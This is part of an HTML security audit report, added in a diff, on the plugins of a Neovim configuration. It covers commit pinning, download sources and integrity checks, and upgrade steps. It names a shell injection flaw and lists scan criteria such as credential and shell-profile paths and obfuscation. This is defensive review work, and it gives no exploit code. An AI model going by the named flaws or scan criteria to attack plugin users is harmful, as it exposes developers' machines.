+          <td class="note"><code>make install_jsregexp</code> builds kmarius/jsregexp from submodules pinned to tags v0.1.0, v0.0.5, v0.0.6 (reviewed). Prebuilt <code>tests/parsers/*.so</code> are test fixtures and never loaded.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/mason-org/mason-lspconfig.nvim">mason-lspconfig.nvim</a><span class="owner">mason-org</span></th>
+          <td><code class="sha" title="40276c4df7e6bdce6801d6c035c6227f9115a855">40276c4df7e6</code><span class="ref">stable-12-g40276c4</span></td>
+          <td class="num">2026-08-27</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Maps lspconfig names to Mason packages. Now installs pinned versions.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/WhoIsSethDaniel/mason-tool-installer.nvim">mason-tool-installer.nvim</a><span class="owner">WhoIsSethDaniel</span></th>
+          <td><code class="sha" title="443f1ef8b5e6bf47045cb2217b6f748a223cf7dc">443f1ef8b5e6</code><span class="ref">(no tags)</span></td>
+          <td class="num">2026-01-22</td>
+          <td><span class="pill note">Note</span></td>
+          <td class="note">Clean, but never set up in your config, so it does nothing. Remove it.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/mason-org/mason.nvim">mason.nvim</a><span class="owner">mason-org</span></th>
+          <td><code class="sha" title="2a6940af80375532e5e9e7c1f2fc6319a1b7a69d">2a6940af8037</code><span class="ref">stable</span></td>
+          <td class="num">2026-06-11</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Downloads packages by design. Evaluates registry template expressions as Lua, so the registry is trusted code. Registry now pinned.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-mini/mini.bufremove">mini.bufremove</a><span class="owner">nvim-mini</span></th>
+          <td><code class="sha" title="281bb1a2c60c3618c854bef2c0933276eb2362c2">281bb1a2c60c</code><span class="ref">v0.18.0-1-g281bb1a</span></td>
+          <td class="num">2026-07-07</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua, ~270 lines.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-mini/mini.icons">mini.icons</a><span class="owner">nvim-mini</span></th>
+          <td><code class="sha" title="98faae31e9be1cc054ae63485e58ceb185efcad0">98faae31e9be</code><span class="ref">v0.18.0-2-g98faae3</span></td>
+          <td class="num">2026-07-07</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Icon tables. Spec URL normalised from the old <code>echasnovski/</code> redirect.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/windwp/nvim-autopairs">nvim-autopairs</a><span class="owner">windwp</span></th>
+          <td><code class="sha" title="430522f95fe4fb7c511ec64f8c1a90cc6a66c05c">430522f95fe4</code><span class="ref">0.10.0-10-g430522f</span></td>
+          <td class="num">2026-08-23</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/neovim/nvim-lspconfig">nvim-lspconfig</a><span class="owner">neovim</span></th>
+          <td><code class="sha" title="bbe6b383a1e85d3a84b54a43f7d9d83567c150cb">bbe6b383a1e8</code><span class="ref">v2.11.0-64-gbbe6b38</span></td>
+          <td class="num">2026-09-01</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Server definitions. Process calls only exist in configs for servers you do not enable (gopls, rust_analyzer, gitlab_duo&hellip;).</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-treesitter/nvim-treesitter">nvim-treesitter</a><span class="owner">nvim-treesitter</span></th>
+          <td><code class="sha" title="427e9222363d07c32d6db6169e4049c28d58d141">427e9222363d</code><span class="ref">v0.9.3-851-g427e9222</span></td>
+          <td class="num">2026-09-01</td>
+          <td><span class="pill note">Note</span></td>
+          <td class="note">Downloads parser tarballs at revisions listed in <code>parsers.lua</code>, then compiles them (F12).</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/JoosepAlviste/nvim-ts-context-commentstring">nvim-ts-context-commentstring</a><span class="owner">JoosepAlviste</span></th>
+          <td><code class="sha" title="6141a40173c6efa98242dc951ed4b6f892c97027">6141a40173c6</code><span class="ref">(no tags)</span></td>
+          <td class="num">2026-04-04</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-lua/plenary.nvim">plenary.nvim</a><span class="owner">nvim-lua</span></th>
+          <td><code class="sha" title="74b06c6c75e4eeb3108ec01852001636d85a932b">74b06c6c75e4</code><span class="ref">v0.1.4-40-g74b06c6</span></td>
+          <td class="num">2026-04-10</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Utility library (jobs, paths, curl wrapper). Only reached through Telescope.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/gnikdroy/projections.nvim">projections.nvim</a><span class="owner">gnikdroy</span></th>
+          <td><code class="sha" title="889914169fa1f5c00fb8659653b5a8330fb223e6">889914169fa1</code><span class="ref">(no tags)</span></td>
+          <td class="num">2023-05-18</td>
+          <td><span class="pill note">Note</span></td>
+          <td class="note">Clean (~700 lines). Unmaintained: last commit 2023-05-18 (F11).</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/MeanderingProgrammer/render-markdown.nvim">render-markdown.nvim</a><span class="owner">MeanderingProgrammer</span></th>
+          <td><code class="sha" title="4663eb3ecd538bd5062628fb6d95bbe6bdca78f6">4663eb3ecd53</code><span class="ref">v8.13.0-1-g4663eb3</span></td>
+          <td class="num">2026-08-11</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Optional LaTeX rendering pipes text through <code>utftex</code>/<code>latex2text</code> on stdin, only if installed.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/seblyng/roslyn.nvim">roslyn.nvim</a><span class="owner">seblyng</span></th>
+          <td><code class="sha" title="de9a98d61ed3fd01b5016eea5fe9e32f1a4c7cfb">de9a98d61ed3</code><span class="ref">(no tags)</span></td>
+          <td class="num">2026-08-13</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Starts the server command you configure. Health check runs <code>dotnet --version</code>.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/folke/snacks.nvim">snacks.nvim</a><span class="owner">folke</span></th>
+          <td><code class="sha" title="882c996cf28183f4d63640de0b4c02ec886d01f2">882c996cf281</code><span class="ref">stable-11-g882c996</span></td>
+          <td class="num">2026-05-25</td>
+          <td><span class="pill note">Note</span></td>
+          <td class="note">Only the picker is enabled. On Windows, frecency downloads an unverified <code>sqlite3.dll</code> (F8).</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-telescope/telescope-fzf-native.nvim">telescope-fzf-native.nvim</a><span class="owner">nvim-telescope</span></th>
+          <td><code class="sha" title="b25b749b9db64d375d782094e2b9dce53ad53a40">b25b749b9db6</code><span class="ref">(no tags)</span></td>
+          <td class="num">2026-05-06</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note"><code>make</code> compiles <code>src/fzf.c</code> locally. No downloads.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-telescope/telescope-project.nvim">telescope-project.nvim</a><span class="owner">nvim-telescope</span></th>
+          <td><code class="sha" title="8e11df94419e444601c09828dadf70890484e443">8e11df94419e</code><span class="ref">(no tags)</span></td>
+          <td class="num">2025-04-23</td>
+          <td><span class="pill issue">Issue</span></td>
+          <td class="note">Unescaped <code>:tcd</code> (F10). Extension is never loaded by your config. Remove it.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/nvim-telescope/telescope.nvim">telescope.nvim</a><span class="owner">nvim-telescope</span></th>
+          <td><code class="sha" title="1e1bab730218eaf97fce743be3f56e51075928ac">1e1bab730218</code><span class="ref">v0.2.2-30-g1e1bab7</span></td>
+          <td class="num">2026-11-08</td>
+          <td><span class="pill fixed">Fixed</span></td>
+          <td class="note">Locked commit <code>40aedd8</code> had the file-name shell injection (F1). Pinned to the upstream fix.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/folke/tokyonight.nvim">tokyonight.nvim</a><span class="owner">folke</span></th>
+          <td><code class="sha" title="cdc07ac78467a233fd62c493de29a17e0cf2b2b6">cdc07ac78467</code><span class="ref">stable-28-gcdc07ac</span></td>
+          <td class="num">2026-03-24</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Colour scheme. URLs and shell snippets live in <code>extras/</code> templates that are never executed.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/folke/which-key.nvim">which-key.nvim</a><span class="owner">folke</span></th>
+          <td><code class="sha" title="3aab2147e74890957785941f0c1ad87d0a44c15a">3aab2147e748</code><span class="ref">stable-8-g3aab214</span></td>
+          <td class="num">2025-10-28</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua UI.</td>
+        </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section aria-labelledby="downloads-h">
+    <header>
+      <h2 id="downloads-h">What gets downloaded, and from where</h2>
+      <p>Everything this config fetches beyond the plugin repositories themselves.</p>
+    </header>
+    <div class="table-wrap">
+      <table class="downloads">
+        <thead><tr><th>Component</th><th>When</th><th>Fetches</th><th>Source</th><th>Integrity check</th><th>Pinned</th></tr></thead>
+        <tbody>
+          <tr><th scope="row">lazy.nvim</th><td>First start, installs, updates</td><td>30 plugin repos; LuaSnip's jsregexp submodules</td><td>github.com (HTTPS)</td><td>Git object IDs</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">LuaSnip build</th><td>Install</td><td>Nothing; compiles jsregexp C sources locally</td><td>Submodules at tags v0.1.0, v0.0.5, v0.0.6</td><td>Git gitlinks</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">telescope-fzf-native build</th><td>Install</td><td>Nothing; compiles <code>src/fzf.c</code></td><td>Plugin repo</td><td>Git</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">blink.cmp</th><td>First use of each tag</td><td>Native fuzzy-matcher library</td><td>GitHub Releases, tag v1.10.2</td><td>SHA-256 from the same release</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">nvim-treesitter</th><td><code>:TSInstall</code>, <code>:TSUpdate</code></td><td>Parser source tarballs, compiled locally</td><td>github.com archives</td><td>None (revision in URL)</td><td><span class="pill ok">Yes</span> 2 by tag</td></tr>
+          <tr><th scope="row">Mason registry</th><td><code>:MasonUpdate</code>, first install</td><td><code>registry.json.zip</code>, <code>checksums.txt</code></td><td>GitHub Releases, 2026-11-23-caring-song</td><td>SHA-256 from the same release</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">Mason packages</th><td>Missing servers on start</td><td>lua-language-server 3.19.2, clangd 23.1.0, basedpyright 1.40.2</td><td>GitHub Releases (LuaLS, clangd); PyPI (basedpyright)</td><td>HTTPS only</td><td><span class="pill ok">Yes</span></td></tr>
+          <tr><th scope="row">Roslyn language server</th><td>Manual</td><td><code>roslyn-language-server</code> .NET tool</td><td>nuget.org (Microsoft)</td><td>NuGet package signing</td><td><span class="pill action">Run it</span></td></tr>
+          <tr><th scope="row">Snacks frecency</th><td>First picker use, Windows only</td><td><code>sqlite3.dll</code> (SQLite 3.48.0)</td><td>www.sqlite.org</td><td>None</td><td><span class="pill info">Fixed URL</span></td></tr>
+          <tr><th scope="row">Snacks icons picker</th><td>Only if you open it</td><td>Icon name lists (data, not code)</td><td>raw.githubusercontent.com</td><td>None</td><td><span class="pill info">No</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section aria-labelledby="changes-h">
+    <header>
+      <h2 id="changes-h">Changes in this branch</h2>
+    </header>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>File</th><th>Change</th></tr></thead>
+        <tbody>
+          <tr><td><code>lua/mosukiton/pins.lua</code></td><td>New. One place for every version: 30 plugin SHAs, the Mason registry release, Mason server versions and the Roslyn tool version, with upgrade instructions.</td></tr>
+          <tr><td><code>lua/mosukiton/plugins.lua</code></td><td>Pinned lazy.nvim bootstrap with verification; <code>pin()</code> attaches a commit to every spec and fails on unpinned plugins; <code>rocks</code>, <code>local_spec</code> and <code>checker</code> off; <code>echasnovski/mini.icons</code> changed to the canonical <code>nvim-mini/mini.icons</code>.</td></tr>
+          <tr><td><code>lazy-lock.json</code></td><td><code>telescope.nvim</code> moved from <code>40aedd8</code> to <code>1e1bab7</code> (F1).</td></tr>
+          <tr><td><code>lua/mosukiton/lsp/mason.lua</code></td><td>Pinned <code>registries</code>.</td></tr>
+          <tr><td><code>lua/mosukiton/lsp/init.lua</code>, <code>lsp/mason-lspconfig.lua</code></td><td><code>ensure_installed</code> now uses <code>name@version</code> from <code>pins.lua</code>.</td></tr>
+          <tr><td><code>lua/mosukiton/lsp/lspconfig/roslyn.lua</code></td><td>Install comment pins an exact version instead of <code>--prerelease</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section aria-labelledby="next-h" id="next">
+    <header>
+      <h2 id="next-h">Next steps</h2>
+      <p>The pins only take effect once your installed copies match them.</p>
+    </header>
+    <ol class="steps">
+      <li><div>
+        <p>Pull this branch, open Neovim and move every plugin to the locked commits. This is what picks up the Telescope fix.</p>
+        <pre>:Lazy restore</pre>
+      </div></li>
+      <li><div>
+        <p>Fetch the pinned Mason registry, then reinstall the servers at their pinned versions.</p>
+        <pre>:MasonUpdate
+:MasonInstall lua-language-server@3.19.2 basedpyright@1.40.2 clangd@23.1.0</pre>
+      </div></li>
+      <li><div>
+        <p>Pin the Roslyn server. Use <code>update</code> if it's already installed, <code>install</code> if not, then check with <code>dotnet tool list --global</code>.</p>
+        <pre>dotnet tool update --global roslyn-language-server --version 5.13.0-1.26514.10</pre>
+      </div></li>
+      <li><div>
+        <p>Optionally confirm the blink.cmp library on disk matches the hash above (Linux path shown).</p>
+        <pre>sha256sum ~/.local/share/nvim/lazy/blink.cmp/target/release/libblink_cmp_fuzzy.so</pre>
+      </div></li>
+      <li><div>
+        <p>To upgrade a plugin later: read the upstream diff between the old and new SHA, change the SHA in <code>pins.lua</code>, run <code>:Lazy update &lt;name&gt;</code> (it checks out the new pin and rewrites <code>lazy-lock.json</code>), and commit both files together.</p>
+      </div></li>
+    </ol>
+  </section>
+
+  <section aria-labelledby="method-h">
+    <header>
+      <h2 id="method-h">How this was checked</h2>
+    </header>
+    <div class="cols">
+      <div>
+        <h3>What was done</h3>
+        <ul class="plain">
+          <li>Cloned all 30 plugins from their canonical GitHub repositories and checked out the locked commits.</li>
+          <li>Confirmed each SHA is reachable from an upstream branch or tag, and recorded its tag, date and distance from upstream.</li>
+          <li>Scanned all 5,303 tracked files for process execution, network access, dynamic code (<code>load</code>, <code>loadstring</code>, <code>dofile</code>, <code>luaeval</code>), obfuscation (long base64, escape runs, <code>string.char</code> chains, XOR), credential and shell-profile paths, and environment reads. Reviewed all 1,010 hits in context.</li>
+          <li>Listed every binary and build file (Makefiles, CMake, <code>build.rs</code>, rockspecs, submodules) and every startup entry point (<code>plugin/</code>, <code>ftplugin/</code>, <code>after/</code>).</li>
+          <li>Searched upstream commits made after each locked commit for security fixes. That surfaced the Telescope patch.</li>
+          <li>Verified external artifacts: blink.cmp release hashes and imports, the jsregexp submodule commits, NuGet metadata for the Roslyn tool, and the Mason registry release assets.</li>
+        </ul>
+      </div>
+      <div>
+        <h3>Limits</h3>
+        <ul class="plain">
+          <li>This is a static review. Large plugins (snacks.nvim, telescope.nvim, nvim-lspconfig, nvim-treesitter, mason.nvim, lazy.nvim) were reviewed through the scan hits and their download, build and execution paths, not read line by line.</li>
+          <li>The language servers Mason installs, the treesitter parser sources and the Roslyn server were not audited themselves; only how they are fetched and pinned.</li>
+          <li>The config wasn't started here: the sandbox blocked downloading a Neovim binary. Every changed Lua file passes a Lua parser, and a script confirmed that all 30 repositories referenced in <code>plugins.lua</code> have a pin and that the pins match <code>lazy-lock.json</code>.</li>
+          <li><code>kickstart.lua</code> in the repo root isn't loaded by <code>init.lua</code>, so its separate, unpinned bootstrap never runs.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    Audit of mosukiton/nvim-config, 2026-11-24. Versions and findings reflect upstream state on that date.
+  </footer>
+</main>
+</body>
+</html>
